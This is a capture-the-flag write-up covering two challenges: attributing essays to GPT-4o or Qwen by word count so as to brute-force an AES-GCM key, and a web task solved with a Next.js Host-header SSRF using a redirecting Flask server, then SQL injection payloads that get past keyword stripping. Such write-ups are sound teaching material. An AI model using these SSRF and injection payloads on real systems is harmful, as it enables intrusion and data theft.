---
dg-publish: true
---
## ai - GPT Detector

>Tired of Turnitin AI detector? It's time to show your reverse card...

From my first Discord message at 12:05pm
>64 files each of `openai/gpt-4o` and `qwen/qwen-2.5-72b-instruct` responses to this prompt, randomly ordered. then order is used to generate a decryption key for the flag (0 for qwen, 1 for gpt)

It sounded like binary classification, so I found a couple of LLM detection papers but nothing that could do attribution without a bunch of training data. So I pivoted to binary k-means clustering with sentence transformers and later TfidfVectorizer. Confidence levels were pretty low even after optimising for n-grams though. Then I took a break while Teddy generated some sample data from both models with OpenRouter.

I came back to start using the data for training, but realised by dumping features that word/phrase choice was pretty similar between models unfortunately. Same with a brief attempt at prefix/suffix strings.

But Teddy realised the file sizes for the qwen samples were consistently larger than the GPT samples, around 4000-5000 bytes. So we could fix the bits for files over a certain size, and bruteforce the rest. Taking a conservative 4500 bytes only gave us 38 files (ie 38 known bits) and the remainder wasn't feasible to bruteforce. I wrote a script to sort by file size anyway, hoping I could work my way down from 4500 and see how long it took. After a fair bit of testing, Teddy realised the file count was also a good heuristic, seemingly above the 500-600 range for qwen. I quickly modified my script to find files above 600 words, and ended up with this:

```python
import os
from pathlib import Path

ESSAYS_DIR = "essays"
WORD_LIMIT = 600

def count_words(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        text = f.read()
        return len(text.split())

def clean_filename(filename):
    # Remove extension and any leading zeros
    name = filename.rsplit('.', 1)[0]  # Remove extension
    return str(int(name)) if name.isdigit() else name

qwen_count = 0
gpt_count = 0

files_info = []
# Walk through essays directory
for file_path in Path(ESSAYS_DIR).glob('*'):
    if file_path.is_file():
        word_count = count_words(file_path)
        classification = "qwen" if word_count > WORD_LIMIT else "gpt"
        files_info.append((file_path.name, word_count, classification))
        if classification == "qwen":
            qwen_count += 1
        else:
            gpt_count += 1

# Sort files by word count (descending)
files_info.sort(key=lambda x: x[1], reverse=True)

# Display summary first
print(f"Summary:")
print(f"Qwen files: {qwen_count}")
print(f"GPT files: {gpt_count}\n")

# Display only file numbers for Qwen files
print("Qwen files (most words to least):")
for name, count, classification in files_info:
    if classification == "qwen":
        clean_name = clean_filename(name)
        print(clean_name)

```

Which was quick to plug into my multithreaded bruteforcing script

```python
from Crypto.Cipher import AES
from itertools import combinations
import numpy as np
from tqdm import tqdm
from math import comb
import time
from concurrent.futures import ProcessPoolExecutor, wait, FIRST_COMPLETED
import multiprocessing
from itertools import islice

nonce_hex = "3d6b85f9299442b2219a44aee1345e16"
ciphertext_hex = ("c88f0e97fbe289c7800a68c2aae64a1825e0405cca87f6360e5f194e43978e17"
                  "72f09a5bd2812cf9db8cf9008be7e34222ed9ee22bf6188358a49ada4e6d5ae16"
                  "e71b0807d414f")
tag_hex = "c58e546b2fed995d0a6a723c8f10f6d1"

nonce = bytes.fromhex(nonce_hex)
ciphertext = bytes.fromhex(ciphertext_hex)
tag = bytes.fromhex(tag_hex)

def try_decrypt(key):
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode('utf-8')
    except Exception as e:
        return None

# Known zero positions (0-indexed)
# zero_positions = {5, 7, 12, 15, 16, 17, 20, 21, 24, 27, 32, 39, 42, 46, 59, 62, 
#                  68, 70, 71, 74, 78, 82, 86, 90, 93, 95, 96, 99, 101, 102, 105, 
#                  107, 109, 111, 115, 116, 117, 121,
#                  73, 118, 108, 81, 49, 66, 91, 87, 36, 106,
#                 #  80, 34, 103, 125, 2, 94, 44, 38, 26, 69, 14
#                  }
zero_positions = {
  17,
  95,
  82,
  48,
  62,
  16,
  101,
  27,
  90,
  109,
  117,
  42,
  12,
  46,
  21,
  86,
  107,
  15,
  93,
  115,
  59,
  70,
  7,
  116,
  68,
  111,
  32,
  39,
  71,
  20,
  121,
  102,
  5,
  81,
  105,
  78,
  96,
  73,
  74,
  49,
  80,
  108,
  91,
  118,
  24,
  36,
  69,
  66,
  99,
  50,
  88,
  34,
  53,
  94,
  103,
  87,
  64,
  72,
  38,
  13,
  # 51,
  # 26,
  # 52
}

def generate_key(bit_pattern):
    # Start with all zeros
    key_bits = np.zeros(128, dtype=np.uint8)
    
    # Fill non-zero positions with the bit pattern
    non_zero_positions = [i for i in range(128) if i not in zero_positions]
    for pos, bit in zip(non_zero_positions, bit_pattern):
        key_bits[pos] = bit
    
    # Convert bit array to bytes
    key_bytes = np.packbits(key_bits).tobytes()
    return key_bytes

def chunk_combinations(iterable, chunk_size):
    iterator = iter(iterable)
    return iter(lambda: list(islice(iterator, chunk_size)), [])

def worker(chunk):
    for ones_positions in chunk:
        bit_pattern = [1 if i in ones_positions else 0 for i in range(128 - len(zero_positions))]
        key = generate_key(bit_pattern)
        result = try_decrypt(key)
        if result:
            return key, result
    return None

def bruteforce():
    # Calculate total combinations
    non_zero_positions = 128 - len(zero_positions)
    total_combinations = comb(non_zero_positions, 64)
    print(f"Total combinations to try: {total_combinations:,}")
    
    # Create all combinations iterator
    positions = range(non_zero_positions)
    all_combinations = combinations(positions, 64)
    
    # Split into chunks for parallel processing
    chunk_size = 1000
    chunks = chunk_combinations(all_combinations, chunk_size)
    
    # Setup progress bar
    pbar = tqdm(total=total_combinations, unit='keys')
    start_time = time.time()
    
    # Use half of available CPU cores
    num_processes = max(1, multiprocessing.cpu_count())
    print(f"Using {num_processes} processes")
    
    with ProcessPoolExecutor(max_workers=num_processes) as executor:
        futures = []
        
        # Submit initial batch of chunks
        for _ in range(num_processes * 2):
            chunk = next(chunks, None)
            if chunk is None:
                break
            futures.append(executor.submit(worker, chunk))
        
        while futures:
            # Wait for the first future to complete
            done, futures = wait(futures, return_when=FIRST_COMPLETED)
            
            for future in done:
                result = future.result()
                pbar.update(chunk_size)
                
                if result:
                    # Found the key
                    key, plaintext = result
                    pbar.close()
                    print(f"\nFound key: {key.hex()}")
                    print(f"Decrypted message: {plaintext}")
                    executor.shutdown(wait=False)
                    return True
                
                # Submit new chunk if available
                chunk = next(chunks, None)
                if chunk is not None:
                    futures.add(executor.submit(worker, chunk))
    
    pbar.close()
    return False

if __name__ == "__main__":
    print("Starting bruteforce...")
    multiprocessing.freeze_support()  # Required for Windows
    if not bruteforce():
        print("Key not found")
```

But it immediately failed. There were 63 files with over 600 words - it was too good to be true. So I started working my way down, commenting out files with the least number of words (51, 26, and 52 in the list) that would be the most likely false positives. Until I eventually hit the solve!

![[Pasted image 20250330011017.png|Pasted image 20250330011017.png]]

Teddy had been writing his own bruteforce in the background, with only 59 known bits (not sure why), and his finished around 15 mins later.
## web - Hide and Seek
>Play Hide-and-Seek with pretty button!  
( + I don't know the internal web server's port exactly, but I heard it's "well-known". )

Three-tier webapp, only source for nextjs frontend and `docker-compose.yml` hinting at backend webserver and db. Frontend called a single endpoint with blind SSRF on `POST /api/reset-game {"url":"https://webhook.tplant.com.au/273441c2-d8d2-47fb-bb3d-107187ac0560"`. The nextjs route would timeout calling IPs from `x-forwarded-for` for 10 mins after a successful request to `url`, but not unsuccessful, so I bruteforced the internal webserver port hinted by the flavourtext to get `http://192.168.200.120:808`. I could also control URL params by adding a fragment to remove the existing params:

`${body.url}?date=${Date()}&message=Congratulation! you found button!`
`http://192.168.200.120:808/?foo=bar#`

Got stuck trying to confirm it was actually blind, and not having to chain another SSRF on the webserver. Until I found this [Assetnote post on a nextjs GET SSRF n-day](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) and realised the frontend was an ancient nextjs version (right before the vuln was patched). Threw together a webhook to test.

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://192.168.200.120:808')
    

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Then implemented `Host` spoofing from the post.

```python
import requests

headers = {
    # "Host": "192.168.200.120:808",  # Using the spoofed host as requested
    "Host": "scene-settings-her-licence.trycloudflare.com",  # Using the spoofed host as requested
    "Next-Action": "6e6feac6ad1fb92892925b4e3766928a754aec71",
    "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    # "Origin": "http://15.165.37.31:3000",
    # "Referer": "http://15.165.37.31:3000/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"
}

response = requests.post("http://3.38.141.72:3000/", data='[]', headers=headers)
print(response.text)
```

And hit the homepage!

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Main Page</title>
</head>

<body>
    <h1>Welcome to Internal server!</h1>
    <a href="/login">Go to Login Page</a>
    <a href="/archive">Go to Archive</a>
</body>

</html>
```

`/archive` required login, but`/login` was helpful.

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>

<body>
    <h1>Login</h1>

    <!-- Just legacy code. But still work. -->
    <!-- Test Account: guest / guest -->

    <!-- <form action="/login" method="get">
        <input name="key" type="hidden" value="392cc52f7a5418299a5eb22065bd1e5967c25341">
        <label for="name">Username</label>
        <input name="username" type="text"><br>
        <label for="name">Password</label>
        <input name="password" type="text"><br>
        <button type="submit">Login</button>
    </form> -->

    <form action="/login" method="post">
        <label for="name">Username</label>
        <input name="username" type="text"><br>
        <label for="name">Password</label>
        <input name="password" type="text"><br>
        <button type="submit">Login</button>
    </form>

</body>

</html>
```

The obvious `/login?key=392cc52f7a5418299a5eb22065bd1e5967c25341&username=guest&password=guest` just returned `{"message":"Welcome! guest, You are not admin."}` though, and I got stuck for a while thinking we needed to access the response's `Set-Cookie` somehow. Or Even hashcracked the key to `neverguessable`. But in the last half hour we realised it was simple SQLi...

`username` and `or` were getting replaced, so we couldn't just `or 1=1`. We tried unicode substitution and comments `user/**/name`, but Bradan came in clutch with `userusernamename` for `username=test\' UNION SELECT * from users WHERE userusernamename LIKE \'%\'-- ;`. That got us the `aaa` user, then it took an intense couple minutes to figure out `admin` was also substituted.

`admadminin` authenticated and told us the flag was the password. toasterpwn tried a column select and after some frantic tries with `password`, we finally got `username=test\' UNION SELECT passwoorrd,1 from users WHERE userusernamename LIKE \'admadminin\' -- ;` and the flag `codegate2025{83ef613335c8534f61d83efcff6c2e18be19743069730d77bf8fb9b18f79bfb9}`.

